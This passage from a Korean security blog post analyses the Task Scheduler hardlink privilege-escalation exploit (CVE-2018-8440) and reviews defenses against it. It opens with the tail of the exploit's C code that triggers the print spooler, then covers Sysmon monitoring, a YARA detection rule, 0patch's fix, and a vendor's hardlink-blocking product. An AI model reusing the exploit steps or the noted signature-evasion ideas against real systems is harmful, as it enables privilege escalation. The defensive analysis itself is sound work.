<span class="n">IXpsPrintJobStream</span> <span class="o">*</span><span class="n">jobStream</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="n">StartXpsPrintJob</span><span class="p">(</span><span class="s">L"Microsoft XPS Document Writer"</span><span class="p">,</span> <span class="s">L"Print Job 1"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">completionEvent</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">job</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">jobStream</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="n">jobStream</span><span class="o">-&gt;</span><span class="n">Close</span><span class="p">();</span>
<span class="n">CoUninitialize</span><span class="p">();</span>
</code></pre></div></div>

<h3 id="대응-방안">대응 방안</h3>

<p>James Forshaw가 발견한 하드링크 이슈는 2015년 말에 발표된 내용이지만, 최근까지도 권한상승 익스플로잇에 활용되고 있다는 사실을 실제 사례를 통해 알아보았습니다.</p>

<p>sandboxescaper의 제로데이 공개 이후 MS가 패치를 릴리즈하기 전까지, 보안 회사와 보안리서처들이 몇 가지 대응방안을 제시했었습니다.</p>

<p>(a) 스풀러 프로세스 감시<sup id="fnref:6"><a href="#fn:6" class="footnote">6</a></sup></p>

<p>Sysinternals 도구 중 하나인 Sysmon<sup id="fnref:7"><a href="#fn:7" class="footnote">7</a></sup>을 이용하여 스풀러 프로세스(spoolsv.exe)가 자식프로세스를 생성하는 행위를 감시하는 방법입니다. 이 방법은 뚜렷한 단점이 존재합니다. 스풀러 프로세스 자체의 취약점이 아닌 이상, sandboxescaper 익스플로잇을 비롯하여 많은 권한상승 익스플로잇이 스풀러가 아닌 다른 시스템프로세스를 통해서 페이로드를 실행시킬 수 있습니다. 또한 spoolsv.exe를 통해서 자식프로세스를 생성(spawn)하지 않고 페이로드를 실행한다면 제안된 방법을 쉽게 우회할 수 있습니다.</p>

<p>(b) tasks 폴더에서 하드링크 생성을 감시하는 방법<sup id="fnref:6:1"><a href="#fn:6" class="footnote">6</a></sup></p>

<p>파일 시스템 감사 로그(File system auditing)를 활성화시켜, 하드링크  생성 로그를 확인하는 방식입니다. 하드링크가 tasks 폴더에서 생성된 사실이 있다면 비정상 행위로 보는 것이죠. sandboxescaper의 익스플로잇을 탐지할 수 있으나, 익스플로잇(취약점)이 다른 폴더에 하드링크를 생성할 수 있는 경우라면 탐지하기 어렵다는 단점이 있습니다. 그렇다고 모든 하드링크 생성 행위를 비정상적으로 판단할 수도 없는 노릇이죠. 또한 로그 확인 방식이라 공격이 실행됐다는 로그만 알려줄 뿐, 공격을 차단하지 못합니다.</p>

<p>(c) 익스플로잇 바이트시퀀스(시그니처) 탐지 방법<sup id="fnref:6:2"><a href="#fn:6" class="footnote">6</a></sup></p>

<p>많은 AV에서 택하는 방식일 것이라 봅니다. 인터넷에서 검색된 YARA 룰 중 한가지는 다음과 같습니다.</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rule TaskSched
{
 strings:
 $a = “c:\\windows\\tasks” wide ascii nocase
 $b = “.job” wide ascii nocase
 $c = “ncalrpc” wide ascii nocase
 $d = “MZ” wide ascii
 
 condition:
 $a and $b and $c and $d
}
</code></pre></div></div>
<p>PE(“MZ”)이고 “.job” “c:\windows\tasks” “ncalrpc” 문자열이 포함되어 있으면 <code class="highlighter-rouge">CVE-2018–8440</code> 익스플로잇이라고 판단하는 것입니다. 이 방법의 단점은 일단 문자열 인코딩 등의 방법으로 탐지 우회가 가능하다는 점입니다. 그리고 오탐의 가능성도 있습니다. 익스플로잇이 아닌 정상실행파일 중에서 저 문자열을 포함하고 있을 가능성도 있는 것이죠. 물론 AV가 사용하는 매칭룰이 저렇게 간단하리라 생각하진 않습니다. 그렇다하더라도 언급한 단점은 여전히 존재합니다. AV의 접근 방식이 취약점 자체를 탐지하거나 패치하는 방식이 아니라서, 익스플로잇 코드는 얼마든지 변형할 수 있어 탐지 우회가 가능해져 버립니다. 그리고 알려지지 않은 제로데이 취약점에 대해서 탐지를 할 수 없다는 단점 역시 명확합니다.</p>

<p>(d) 태스크 스케쥴러 권한을 낮추는 방법<sup id="fnref:8"><a href="#fn:8" class="footnote">8</a></sup>(Impersonation)</p>

<p><code class="highlighter-rouge">SchRpcSetSecurity</code>의 내부 동작 중에서 취약점과 가장 관련이 있었던 부분은 바로 DACL을 변경하는 부분입니다. 여기서 제안한 방법은 태스크 스케쥴러가 DACL을 변경하기 직전에 현재 스레드 토큰을 사용자(클라이언트)의 토큰으로 교체하는 것입니다. DACL을 변경하는 작업 전에 태스크스케쥴러의 권한을 사용자(클라이언트) 권한으로 잠시 낮추는 것이라 생각하면 됩니다. 이렇게 되면 하드링크대상(예: PrintConfig.dll)의 DACL을 변경할 수 있는 권한이 사용자(클라이언트)에게 없으므로 취약점은 동작하지 않게 됩니다. 이 방법이 태스크스케쥴러 취약점을 해결하는 적절한 대응이라 생각합니다. 아마 마이크로소프트도 비슷한 방식으로 패치를 하지 않았을까 추측해봅니다. 이 방법을 제안한 0patch라는 제품은 태스크스케쥴러의 <code class="highlighter-rouge">SchRpcSetSecurity</code> 함수 코드 부분을 바이너리 패치하는 방식으로 해당 작업을 구현했습니다. 하지만 제안된 방식은 태스크스케쥴러 취약점만 패치한 것이라서, 새로운 권한상승 취약점에 대해선 방어할 수 없다는 단점이 있습니다.</p>

<h3 id="x-diffense">X-DIFFENSE</h3>

<p>저희 회사에서 개발중인 <strong>X-DIFFENSE</strong>(출시예정)에서는 권한상승 공격 중에서 하드링크가 필수적으로 요구되는 익스플로잇(취약점)에 대한 탐지 전략 중 하나로 James Forshaw가 발견한 하드링크 생성 방식의 특징을 이용합니다.</p>

<p>권한상승 과정 중에서 하드링크가 필요하다는 것의 의미는 높은 권한의 공격대상 프로세스(예:태스크스케쥴러)를 통해 하드링크 대상의 파일을 조작하거나 퍼미션을 변경하도록 만들어버리기 위함이죠. 따라서 권한상승 익스플로잇에서 사용하는 하드링크 타겟파일은 일반사용자(혹은 해커)가 쓰기 접근이 불가능한 경우가 거의 대부분입니다. 권한 상승 익스플로잇이 하드링크가 필요할 경우 표준 API인 <code class="highlighter-rouge">CreateHardLink</code> 대신 <code class="highlighter-rouge">CreateNativeHardLink</code>를 사용해야만 하는 이유가 되는 것이죠.</p>

<p>따라서 하드링크 생성 요청 중에서 타겟파일이 FILE_WRITE_ATTRIBUTES로 오픈되지 않은 경우(정상적인 경우가 아니죠. MS 표준 CreateHardLink를 사용하지 않았다는 명백한 증거니까요!)라면, 권한상승 시도 중의 하나라고 판단하고 이를 차단하는 방식을 사용합니다. 이러한 방식은 하드링크를 활용하는 권한상승 익스플로잇(앞으로 나올 제로데이를 포함하여)을 효과적으로 탐지할 수 있는 방법입니다.</p>

<p>X-DIFFNSE는 커널레벨(파일시스템)에서 방금 언급한 방법을 적용해 비정상적인 하드링크 생성 행위를 감시하여 권한상승 시도 행위를 효과적으로 차단할 수 있습니다.</p>

<h3 id="reference">Reference</h3>

<div class="footnotes">
  <ol>
    <li id="fn:1">
      <p>MSDN, https://docs.microsoft.com/en-us/windows/desktop/api/winbase/nf-winbase-createhardlinka <a href="#fnref:1" class="reversefootnote">&#8617;</a></p>
    </li>
    <li id="fn:2">
      <p>James Forshaw, Project Zero Blog, https://googleprojectzero.blogspot.com/2015/12/between-rock-and-hard-link.html <a href="#fnref:2" class="reversefootnote">&#8617;</a></p>
    </li>
    <li id="fn:3">
      <p>James Forshaw, https://github.com/googleprojectzero/symboliclink-testing-tools <a href="#fnref:3" class="reversefootnote">&#8617;</a></p>
    </li>
    <li id="fn:4">
      <p>PowerPool malware exploits ALPC LPE zero-day vulnerability, https://www.welivesecurity.com/2018/09/05/powerpool-malware-exploits-zero-day-vulnerability/ <a href="#fnref:4" class="reversefootnote">&#8617;</a></p>
    </li>
    <li id="fn:5">
      <p>Task Scheduler LPE from SandboxEscaper, https://github.com/jackson5-sec/TaskSchedLPE <a href="#fnref:5" class="reversefootnote">&#8617;</a></p>
    </li>
    <li id="fn:6">
      <p>Task Scheduler ALPC exploit high level analysis – CVE-2018–8440, https://doublepulsar.com/task-scheduler-alpc-exploit-high-level-analysis-ff08cda6ad4f <a href="#fnref:6" class="reversefootnote">&#8617;</a> <a href="#fnref:6:1" class="reversefootnote">&#8617;<sup>2</sup></a> <a href="#fnref:6:2" class="reversefootnote">&#8617;<sup>3</sup></a></p>
    </li>
    <li id="fn:7">
      <p>Sysmon, MS Sysinternals, https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon <a href="#fnref:7" class="reversefootnote">&#8617;</a></p>
    </li>
    <li id="fn:8">
      <p>How We Micropatched a Publicly Dropped 0day in Task Scheduler (CVE-2018-8440), https://blog.0patch.com/2018/08/how-we-micropatched-publicly-dropped.html <a href="#fnref:8" class="reversefootnote">&#8617;</a></p>
    </li>
  </ol>
</div>

  
    
      <small><em>post by: Yongil Lee of Diffense </em></small>
    
  
</article>





	  <script>
	    $("article").fitVids();
	    $('article p').each(function(i){
				if (($(this).find('img').length) && (!$.trim($(this).text()).length))  {
					$(this).addClass('img-only');
				}
				if ($.trim($(this).text()).length - $.trim($(this).find('small').text()).length == 0 && ($(this).find('img').length)){
					$(this).addClass('img-only-source');
				}
	  	});
	  </script>
	</div>
	<footer>
  <div class="inner">
    <p>This is the footer.<br><a href="http://steinvc.github.io/holo-alfa/">Holo Alfa</a> Jekyll theme crafted by <a href="http://steinvc.github.io/holo-alfa/">Stijn</a>.</p>
  </div>
</footer>

</body>
</html>
